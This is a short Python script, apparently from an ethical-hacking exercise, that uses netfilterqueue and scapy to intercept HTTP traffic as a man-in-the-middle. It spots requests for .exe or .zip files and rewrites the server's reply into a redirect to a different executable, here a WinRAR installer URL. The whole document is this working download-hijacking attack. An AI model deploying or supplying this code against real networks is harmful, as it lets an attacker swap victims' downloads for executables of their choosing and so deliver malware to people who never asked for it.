#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers.l2 import *

ack_list = []

def set_load(packet, url):
    packet[scapy.Raw].load = url
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # convert packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #check if there is a tcp layer
        if scapy_packet.haslayer(scapy.TCP):
            # http data is in the raw layer
            # if the destination port is 80, its a request
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+]HTTP REQUEST")
                load = scapy_packet[scapy.Raw].load
                keywords = [".zip", ".ZIP", ".exe", ".EXE"]
                for keyword in keywords:
                    if keyword in str(load):
                        print("[+]EXE or ZIP Request")
                        # store the ack/seq from the TCP layer of the http request
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                        print(scapy_packet.show())
            # a packet is leaving via an http port
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+]HTTP Response")
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-701ca.exe\n\n")
                    packet.set_payload(bytes(modified_packet))
                    print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
# use bind to identify the queue number
queue.bind(0, process_packet)
queue.run()
